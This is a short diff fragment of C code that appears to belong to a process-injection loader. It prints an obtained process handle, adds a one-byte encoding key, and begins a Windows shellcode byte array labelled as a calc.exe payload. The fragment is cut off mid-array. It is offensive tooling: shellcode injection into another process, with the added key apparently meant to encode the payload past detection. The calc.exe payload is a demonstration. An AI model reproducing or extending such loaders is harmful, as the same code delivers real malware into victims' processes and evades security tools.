@@ -21,7 +21,7 @@ int main(int argc, char* argv[]){
     }
     printf("[*] Obtained handle: %x\n", hProc);
 
-	
+	unsigned char key = '\x69';
 
 	unsigned char shellcode[] = //payload - calc.exe
 		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
